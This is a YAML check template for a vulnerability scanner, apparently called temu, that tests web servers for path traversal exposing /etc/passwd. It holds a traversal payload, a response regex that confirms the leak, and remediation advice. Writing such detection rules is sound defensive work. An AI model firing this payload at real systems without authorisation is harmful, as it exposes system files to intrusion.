schema_version: "1"
metadata:
  author: "sangkan-dev"
  license: "MIT"
  source: "https://github.com/sangkan-dev/temu"
  last_verified: "2026-05-24"
compatibility:
  minimum_temu_version: "1.3.0"
  required_capabilities: ["http"]
id: "PATH-TRAVERSAL-LINUX-PASSWD"
name: "Path traversal exposure (Linux passwd)"
tech_stack: []
severity: high
cvss: 7.5
payload: "/../../../../../../etc/passwd"
request_method: GET
verify:
  match_type: BodyRegex
  response_codes: [200]
  body_regex: "root:.*:0:0:"
cve_id: null
remediation: "Normalize paths, reject traversal sequences, and serve files only from an allowlisted directory."
references:
  - "https://owasp.org/www-community/attacks/Path_Traversal"
